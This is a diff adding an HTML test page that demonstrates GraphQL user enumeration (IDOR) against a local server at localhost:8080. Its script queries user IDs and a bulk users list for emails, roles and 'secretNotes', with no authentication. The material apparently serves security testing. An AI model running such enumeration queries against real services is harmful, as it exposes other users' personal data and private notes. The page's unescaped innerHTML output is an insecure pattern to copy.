@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GraphQL User Enumeration Test</title>
+</head>
+<body>
+    <h2>GraphQL User Enumeration (IDOR)</h2>
+    
+    <button onclick="testUser(1)">Query User ID 1</button>
+    <button onclick="testUser(2)">Query User ID 2</button>
+    <button onclick="testUser(3)">Query User ID 3</button>
+    <button onclick="testUser(999)">Query User ID 999</button>
+    <button onclick="testAllUsers()">Query All Users</button>
+    
+    <div id="results"></div>
+
+    <script>
+    function testUser(userId) {
+        const query = `
+            query {
+                user(id: ${userId}) {
+                    id
+                    username
+                    email
+                    role
+                    secretNotes
+                }
+            }
+        `;
+        
+        fetch('http://localhost:8080/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ query })
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('results').innerHTML += 
+                '<h3>User ID ' + userId + ':</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        })
+        .catch(error => {
+            document.getElementById('results').innerHTML += 
+                '<h3>User ID ' + userId + ':</h3><p>Error: ' + error + '</p>';
+        });
+    }
+    
+    function testAllUsers() {
+        const query = `
+            query {
+                users(limit: 100) {
+                    id
+                    username
+                    email
+                    role
+                    secretNotes
+                }
+            }
+        `;
+        
+        fetch('http://localhost:8080/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ query })
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('results').innerHTML += 
+                '<h3>All Users Query:</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        });
+    }
+    </script>
+</body>
+</html>
